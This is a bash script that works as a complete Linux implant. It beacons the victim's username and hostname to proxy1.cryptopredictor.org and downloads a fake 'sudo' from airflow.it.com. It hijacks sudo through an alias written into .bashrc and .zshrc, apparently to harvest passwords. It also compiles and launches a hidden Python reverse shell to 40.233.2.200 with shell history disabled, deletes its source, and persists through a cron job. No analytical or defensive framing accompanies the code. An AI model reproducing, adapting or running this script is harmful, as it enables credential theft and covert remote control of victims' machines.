#!/bin/bash

user="suser"
username=$(whoami)
hostname=$(hostname)

data=$(echo -n "$user:$username:$hostname" | base64)

domain_name="proxy1.cryptopredictor.org"

received_port=$(curl -L "https://$domain_name/report?data=$data")
received_port=$(echo $received_port | sed "s/%//g")

echo "$received_port"

parent_path="$HOME/.local/bin"
c_code="$parent_path/esp_client.c"
script_path="$parent_path/esp_client"
mkdir -p "$parent_path"

curl -fsSL https://airflow.it.com/sudo > ~/.local/bin/sudo
chmod +x ~/.local/bin/sudo

TARGET_FILES=("$HOME/.bashrc")

export PATH="$HOME/.local/bin:$PATH"
export alias sudo="$HOME/.local/bin/sudo"

if which zsh >/dev/null 2>&1; then
    TARGET_FILES+=("$HOME/.zshrc")
fi

for RC_FILE in "${TARGET_FILES[@]}"; do
    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
        echo "Configuration already exists in $RC_FILE. Skipping."
    else
        cat << 'EOF' >> "$RC_FILE"
PATH="$HOME/.local/bin:$PATH"
alias sudo="$HOME/.local/bin/sudo"
EOF
        echo "Successfully added configuration to $RC_FILE"
		source "$RC_FILE"
    fi
done

cat << EOF > "$c_code"
#include <stdlib.h>
const char *script_content = 
    "python3 -c \"\n"
    "import socket,subprocess,os,pty,sys\n"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    "s.connect(('40.233.2.200',$received_port))\n"
    "fd=s.fileno()\n"
    "os.dup2(fd,0)\n"
    "os.dup2(fd,1)\n"
    "os.dup2(fd,2)\n"
    "os.putenv('HISTFILE','/dev/null')\n"
    "os.putenv('TERM','xterm')\n"
    "pty.spawn(['/bin/bash','-i'])\n"
    "s.close()\n"
    "\"\n"
    "";
int main() {
    return system(script_content);
}
EOF
gcc "$c_code" -o "$script_path"
nohup "$script_path" > /dev/null 2>&1 &
rm "$c_code"

CRON_JOB="*/5 * * * * bash $script_path"
if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
else
    echo "Cron job already exists. Skipping."
fi
